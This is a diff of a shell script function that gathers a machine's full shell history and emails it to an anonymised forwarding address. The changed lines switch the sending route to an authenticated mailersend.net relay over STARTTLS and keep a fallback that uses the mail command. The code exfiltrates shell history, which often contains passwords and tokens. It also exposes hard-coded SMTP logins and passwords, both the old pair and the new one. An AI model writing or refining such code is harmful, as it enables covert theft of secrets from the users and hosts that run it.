@@ -74,18 +74,19 @@ EOF
     recipient="ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com"
     subject="Full Shell History Report from $HOSTNAME"
 
-    smtp_server="24-mail.com"
-    port=25
-    sender_email="bash@24-mail.com"
-    password="55Marko55"
+    smtp_server="smtp.mailersend.net"
+    port=587
+    sender_email="MS_wfRIsR@trial-yxj6lj9x6614do2r.mlsender.net"
+    password="mssp.JfxiTRI.351ndgwy7ndlzqx8.AMTiGYy"
 
     # Create a temporary file to store the email content
     TEMP_FILE=$(mktemp)
     echo -n "$EMAIL_CONTENT" > "$TEMP_FILE"
 
-    # Try sending email via Python without SSL/TLS on port 25
+    # Try sending email via Python with STARTTLS
     python_result=$(python -c "
 import smtplib
+import ssl
 import os
 
 port = $port
@@ -101,29 +102,27 @@ with open(body_file, 'r', encoding='utf-8', errors='ignore') as f:
 
 message = f'Subject: {subject}\\n\\n{body}'
 
+context = ssl.create_default_context()
 try:
     with smtplib.SMTP(smtp_server, port) as server:
         server.ehlo()
+        server.starttls(context=context)
+        server.ehlo()
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.encode('utf-8', errors='ignore'))
-    print('Email sent successfully via Python using 24-mail.com on port 25 (no SSL/TLS).')
+    print('Email sent successfully via Python using smtp.mailersend.net.')
     exit(0)
 except Exception as e:
-    print(f'Error sending email via Python using 24-mail.com on port 25 (no SSL/TLS): {e}')
+    print(f'Error sending email via Python using smtp.mailersend.net: {e}')
     print(f'Details: {e}')
     exit(1)
 "
     )
     python_exit_code=$?
 
-    rm -f "$TEMP_FILE"
-
-    # Check the result of the Python script
-    if [ "$python_exit_code" -eq 0 ]; then
+    # Fallback logic (using TEMP_FILE)
+    if [ "$python_exit_code" -ne 0 ]; then
         echo "$python_result"
-    else
-        echo "$python_result"
-        # Fallback to using mail command if Python failed
         if command -v mail &>/dev/null; then
             echo "Sending email using mail command..."
             cat "$TEMP_FILE" | mail -s "$subject" "$recipient"
@@ -138,6 +137,9 @@ except Exception as e:
             echo "System report stored in /tmp/system_report.txt"
         fi
     fi
+
+    # Clean up the temporary file
+    rm -f "$TEMP_FILE"
 }
 
 
